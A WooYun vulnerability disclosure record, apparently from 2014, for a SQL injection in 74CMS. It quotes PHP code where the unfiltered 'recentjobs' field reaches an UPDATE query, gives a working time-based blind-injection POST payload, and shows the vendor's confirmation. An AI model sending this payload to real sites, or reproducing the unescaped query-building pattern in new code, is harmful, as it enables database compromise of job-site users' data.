{"id": 2024, "wybug_id": "wooyun-2014-060912", "wybug_title": "74CMS最新版SQL注入漏洞", "wybug_corp": "74c,s.com", "wybug_author": "路人甲", "wybug_date": "2014-05-19 17:14", "wybug_open_date": "2014-08-17 17:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向公众公开  简要描述： ~~ 详细说明：  文件：/user/personal/personal_resume.php\n//保存-求职意向elseif ($act=='make2_save'){\t\t$resumeuid=intval($_SESSION['uid']);\t$resumepid=intval($_REQUEST['pid']);\tif ($resumeuid==0 || $resumepid==0 ) showmsg('参数错误！',1);\t$resumearr['recentjobs']=trim($_POST['recentjobs']);\t$resumearr['nature']=intval($_POST['nature'])?intval($_POST['nature']):showmsg('请选择期望岗位性质！',1);\t$resumearr['nature_cn']=trim($_POST['nature_cn']);\t$resumearr['district']=trim($_POST['district'])?intval($_POST['district']):showmsg('请选择期望工作地！',1);\t$resumearr['sdistrict']=intval($_POST['sdistrict']);\t$resumearr['district_cn']=trim($_POST['district_cn']);\t$resumearr['wage']=intval($_POST['wage'])?intval($_POST['wage']):showmsg('请选择期望月薪！',1);\t$resumearr['wage_cn']=trim($_POST['wage_cn']);\t$resumearr['trade']=$_POST['trade']?trim($_POST['trade']):showmsg('请选择期望从事的行业！',1);\t$resumearr['trade_cn']=trim($_POST['trade_cn']);\t$resumearr['intention_jobs']=trim($_POST['intention_jobs']);\tif ($_CFG['audit_edit_resume']!=\"-1\")\t{\t$resumearr['audit']=$_CFG['audit_edit_resume'];\t}\tadd_resume_jobs($resumepid,$_SESSION['uid'],$_POST['intention_jobs_id'])?\"\":showmsg('更新失败！',0);\tupdatetable(table('resume'),$resumearr,\" id='{$resumepid}'  AND   uid='{$resumeuid}'\");\tupdatetable(table('resume_tmp'),$resumearr,\" id='{$resumepid}'  AND   uid='{$resumeuid}'\");\tcheck_resume($_SESSION['uid'],intval($_REQUEST['pid']));\tif ($_POST['go_resume_show'])\t{\t\theader(\"Location: ?act=resume_show&pid={$resumepid}\");\t}\telse\t{\theader(\"Location: ?act=make3&pid=\".intval($_POST['pid']));\t}}\n参数recentjobs没有过滤进入updatetable进行更新\nfunction updatetable($tablename, $setsqlarr, $wheresqlarr, $silent=0) {\tglobal $db;\t$setsql = $comma = '';\tforeach ($setsqlarr as $set_key => $set_value) {\t\tif(is_array($set_value)) {\t\t\t$setsql .= $comma.'`'.$set_key.'`'.'='.$set_value[0];\t\t} else {\t\t\t$setsql .= $comma.'`'.$set_key.'`'.'=\\''.$set_value.'\\'';\t\t}\t\t$comma = ', ';\t}\t$where = $comma = '';\tif(empty($wheresqlarr)) {\t\t$where = '1';\t} elseif(is_array($wheresqlarr)) {\t\tforeach ($wheresqlarr as $key => $value) {\t\t\t$where .= $comma.'`'.$key.'`'.'=\\''.$value.'\\'';\t\t\t$comma = ' AND ';\t\t}\t} else {\t\t$where = $wheresqlarr;\t}\treturn $db->query(\"UPDATE \".($tablename).\" SET \".$setsql.\" WHERE \".$where, $silent?\"SILENT\":\"\");}\n也没有过滤，导致SQL注入。   漏洞证明：  加单引号后：\n\n下面使用盲注：\n链接：http://localhost/74cms/user/personal/personal_resume.php?act=make2_savePOST：recentjobs=111111' WHERE uid='1' AND id='1' And if(mid(user(),1,1)='r',sleep(5),1)#&nature=62&nature_cn=%C8%AB%D6%B0&district_cn=%B1%B1%BE%A9%CA%D0%2F%B6%AB%B3%C7%C7%F8&district=1&sdistrict=35&wage_cn=3000%7E5000%D4%AA%2F%D4%C2&wage=59&intention_jobs=%CF%EE%C4%BF%BE%AD%C0%ED%2F%B2%FA%C6%B7%BE%AD%C0%ED&intention_jobs_id=19.20&trade_cn=%BD%F0%C8%DA%28%D2%F8%D0%D0%2F%B1%A3%CF%D5%29&trade=10&pid=1&go_resume_show=1\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-05-20 15:35 厂商回复： ok 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}